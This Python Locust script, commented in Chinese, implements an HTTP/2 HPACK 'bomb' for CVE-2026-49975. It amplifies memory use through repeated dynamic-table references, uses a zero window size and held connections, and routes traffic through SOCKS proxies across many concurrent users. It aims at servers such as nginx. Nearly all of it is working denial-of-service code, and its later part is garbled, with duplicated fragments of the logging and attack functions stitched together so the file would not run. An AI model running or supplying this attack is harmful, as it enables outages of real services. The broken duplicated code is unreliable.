#!/usr/bin/env python3
"""
CVE-2026-49975 专用压测脚本
支持 SOCKS5 / HTTP 代理
"""

from locust import User, task, constant, events
import socket
import ssl
import struct
import time
import logging
import os
import socks

logger = logging.getLogger(__name__)

REFERENCES = int(os.environ.get("LOCUST_REFERENCES", "2048"))
HOLD_SECONDS = int(os.environ.get("LOCUST_HOLD_SECONDS", "15"))
STREAMS = int(os.environ.get("LOCUST_STREAMS", "1"))

SOCKS5_PROXY = os.environ.get("SOCKS5_PROXY", "").strip()
HTTP_PROXY = os.environ.get("HTTP_PROXY", "").strip()
HTTPS_PROXY = os.environ.get("HTTPS_PROXY", "").strip()
PROXY_URL = SOCKS5_PROXY or HTTP_PROXY or HTTPS_PROXY or ""


def parse_proxy(proxy_url):
    if not proxy_url:
        return None, None, None
    proxy_url = proxy_url.strip()
    if "://" not in proxy_url:
        proxy_type = socks.SOCKS5
        host, port = proxy_url.rsplit(":", 1)
        return proxy_type, host.strip(), int(port)
    if proxy_url.startswith("socks5://"):
        proxy_type = socks.SOCKS5
        rest = proxy_url[8:]
    elif proxy_url.startswith("socks4://"):
        proxy_type = socks.SOCKS4
        rest = proxy_url[9:]
    elif proxy_url.startswith("http://"):
        proxy_type = "http"
        rest = proxy_url[7:]
    elif proxy_url.startswith("https://"):
        proxy_type = "http"
        rest = proxy_url[8:]
    else:
        logger.warning(f"未知的代理协议: {proxy_url}")
        return None, None, None
    if "@" in rest:
        rest = rest.split("@")[-1]
    if ":" in rest:
        host, port_str = rest.split(":", 1)
        port = int(port_str.split("/")[0])
    else:
        host = rest.split("/")[0]
        port = 1080 if proxy_type == socks.SOCKS5 else 8080
    return proxy_type, host, port


def create_connection(address, timeout=None, proxy_params=None):
    proxy_type, proxy_host, proxy_port = proxy_params or (None, None, None)
    if proxy_type == socks.SOCKS5:
        sock = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
        sock.set_proxy(
            proxy_type=socks.SOCKS5,
            addr=proxy_host,
            port=proxy_port,
            username=os.environ.get("SOCKS5_USER", ""),
            password=os.environ.get("SOCKS5_PASS", ""),
        )
        if timeout:
            sock.settimeout(timeout)
        sock.connect(address)
        return sock
    elif proxy_type == socks.SOCKS4:
        sock = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
        sock.set_proxy(
            proxy_type=socks.SOCKS4,
            addr=proxy_host,
            port=proxy_port,
            username=os.environ.get("SOCKS4_USER", ""),
        )
        if timeout:
            sock.settimeout(timeout)
        sock.connect(address)
        return sock
    else:
        return socket.create_connection(address, timeout=timeout)


PROXY_PARAMS = parse_proxy(PROXY_URL)

CLIENT_PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
SETTINGS_FRAME_TYPE = 0x04
HEADERS_FRAME_TYPE = 0x01


def build_frame(frame_type, flags, stream_id, payload):
    length = len(payload)
    return (
        struct.pack(">I", length)[1:]
        + struct.pack("BB", frame_type, flags)
        + struct.pack(">I", stream_id & 0x7FFFFFFF)
        + payload
    )


def build_settings(initial_window_size=0, max_frame_size=16384):
    p = struct.pack(">HI", 0x04, initial_window_size)
    p += struct.pack(">HI", 0x05, max_frame_size)
    return build_frame(SETTINGS_FRAME_TYPE, 0x00, 0, p)


def build_headers_frame(stream_id, indexed_references=2048):
    name = b"cookie"
    value = b"a" * 255
    insert_prefix = bytes([0x40, len(name)]) + name + bytes([len(value)]) + value
    indexed_ref = bytes([0xBE])
    payload = insert_prefix + indexed_ref * indexed_references
    return build_frame(HEADERS_FRAME_TYPE, 0x04 | 0x01, stream_id, payload)


class Http2BombUser(User):
    wait_time = constant(0)
    references_per_stream = REFERENCES
    streams_per_connection = STREAMS
    hold_seconds = HOLD_SECONDS
    _ssl_ctx = None

    @classmethod
    def _get_ssl_ctx(cls):
        if cls._ssl_ctx is None:
            ctx = ssl.create_default_context()
            ctx.set_alpn_protocols(["h2"])
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            cls._ssl_ctx = ctx
        return cls._ssl_ctx

    def _parse_host(self):
        host = self.host or "https://127.0.0.1"
        if host.startswith("https://"):
            rest, use_tls = host[8:], True
            default_port = 443
        elif host.startswith("http://"):
            rest, use_tls = host[7:], False
            default_port = 80
        else:
            rest, use_tls = host, True
            default_port = 443
        if ":" in rest:
            hostname, port_str = rest.split(":", 1)
            port = int(port_str.split("/")[0])
        else:
            hostname = rest.split("/")[0]
            port = default_port
        return hostname, port, use_tls

    @task
    def http2_bomb_attack(self):
        hostname, port, use_tls = self._parse_host()
        sock = None
        start_time = time.time()
        exception = None

        try:
            sock = create_connection(
                (hostname, port),
                timeout=10.0,
                proxy_params=PROXY_PARAMS
            )

            if use_tls:
                sock = self._get_ssl_ctx().wrap_socket(
                    sock,
                    server_hostname=hostname
                )

            sock.sendall(CLIENT_PREFACE)
            sock.sendall(build_settings(initial_window_size=0))

            for sid in range(1, 2 * self.streams_per_connection, 2):
                frame = build_headers_frame(sid, self.references_per_stream)
                sock.sendall(frame)

            if self.hold_seconds > 0:
                end_time = time.time() + self.hold_seconds
                while time.time() < end_time:
                    try:
                        sock.settimeout(1.0)
                        data = sock.recv(4096)
                        if not data:
                            break
                    except socket.timeout:
                        continue
                    except OSError:
                        break

        except Exception as e:
            exception = e

        finally:
            if sock:
                try:
                    sock.close()
                except Exception:
                    pass

            total_time = int((time.time() - start_time) * 1000)
            proxy_name = "xray" if PROXY_URL else "direct"
            req_name = "/ (refs=" + str(self.references_per_stream)
            req_name += ", hold=" + str(self.hold_seconds) + "s"
            req_name += ", via=" + proxy_name + ")"

            self.environment.events.request.fire(
                request_type="H2-BOMB",
                name=req_name,
                response_time=total_time,
                response_length=0,
                exception=exception,
                context={},
            )


@events.init.add_listener
def on_test_start(environment, **kw):
    proxy_display = PROXY_URL if PROXY_URL else "直连"
    logger.info("=" * 60)
    logger.info("  CVE-2026-49975 HTTP/2 HPACK 炸弹压测")
    logger.info("  并发用户数     : " + str(environment.runner.target_user_count))
    logger.info("  HPACK 引用次数 : " + str(REFERENCES))
    logger.info("  连接保持秒数   : " + str(HOLD_SECONDS))
    logger.info("  目标地址       : " + str(environment.host))
    logger.info("  代理设置       : " + proxy_display)
    logger.info("  测试时长       : " + str(environment.runner.run_time) + "秒")
    logger.info("=" * 60)  exception=exception,
                context={},
            )


@events.init.add_listener
def on_test_start(environment, **kw):
    proxy_display = PROXY_URL if PROXY_URL else "直连"
    logger.info("=" * 60)
    logger.info("  CVE-2026-49975 HTTP/2 HPACK 炸弹压测")
    logger.info(f"  并发用户数     : {environment.runner.target_user_count}")
    logger.info(f"  HPACK 引用次数 : {REFERENCES}")
    logger.info(f"  连接保持秒数   : {HOLD_SECONDS}")
    logger.info(f"  目标地址       : {environment.host}")
    logger.info(f"  代理设置       : {proxy_display}")
    logger.info(f"  测试时长       : {environment.runner.run_time}秒")
    logger.info("=" * 60)           sock.sendall(CLIENT_PREFACE)
            sock.sendall(build_settings(initial_window_size=0))

            # ---- 4. 发送 HPACK 炸弹 HEADERS 帧 ----
            for sid in range(1, 2 * self.streams_per_connection, 2):
                frame = build_headers_frame(sid, self.references_per_stream)
                sock.sendall(frame)

            # ---- 5. 保持连接存活 ----
            if self.hold_seconds > 0:
                end_time = time.time() + self.hold_seconds
                while time.time() < end_time:
                    try:
                        sock.settimeout(1.0)
                        data = sock.recv(4096)
                        if not data:
                            break
                    except socket.timeout:
                        continue
                    except OSError:
                        break

        except Exception as e:
            exception = e

        finally:
            if sock:
                try:
                    sock.close()
                except Exception:
                    pass

            # ===== 手动上报请求统计到 Locust =====
            total_time = int((time.time() - start_time) * 1000)
            request_name = (
                f"/ (refs={self.references_per_stream}, "
                f"hold={self.hold_seconds}s, proxy={bool(PROXY_URL)})"
            )

            # 通过 self.environment.events 访问
            self.environment.events.request.fire(
                request_type="H2-BOMB",
                name=request_name,
                response_time=total_time,
                response_length=0,
                exception=exception,
                context={},
            )


# ============================================================
# 启动时输出配置信息
# ============================================================

@events.init.add_listener
def on_test_start(environment, **kw):
    proxy_display = PROXY_URL if PROXY_URL else "直连（无代理）"
    
    logger.info("=" * 60)
    logger.info("  CVE-2026-49975 HTTP/2 HPACK 炸弹压测")
    logger.info(f"  并发用户数 (-u)    : {environment.runner.target_user_count}")
    logger.info(f"  HPACK 引用次数     : {REFERENCES}")
    logger.info(f"  连接保持秒数       : {HOLD_SECONDS}")
    logger.info(f"  每连接流数         : {STREAMS}")
    logger.info(f"  目标地址           : {environment.host}")
    logger.info(f"  代理设置           : {proxy_display}")
    logger.info(f"  测试时长           : {environment.runner.run_time}秒")
    logger.info("=" * 60)
    logger.info("  观察目标服务器内存:")
    logger.info("  $ watch -n 2 'ps aux | grep nginx | grep -v grep'")
    logger.info("=" * 60)